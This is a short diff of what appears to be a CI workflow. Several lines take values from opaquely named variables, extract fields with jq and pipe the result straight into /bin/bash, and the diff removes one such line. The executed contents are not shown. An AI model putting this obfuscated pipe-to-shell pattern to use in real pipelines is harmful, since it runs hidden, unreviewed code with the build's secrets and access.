@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$pl4" | jq -r .gkyt4 | /bin/bash
           echo $jw02909 | jq -r .ktqq061 | /bin/bash
           echo $srbp89 | jq -r .kapii03677 | /bin/bash
-          echo $ot012 | jq -r .zwr605 | /bin/bash
           echo $ec9933 | jq -r .bjuvo1 | /bin/bash
 
       - name: Save data
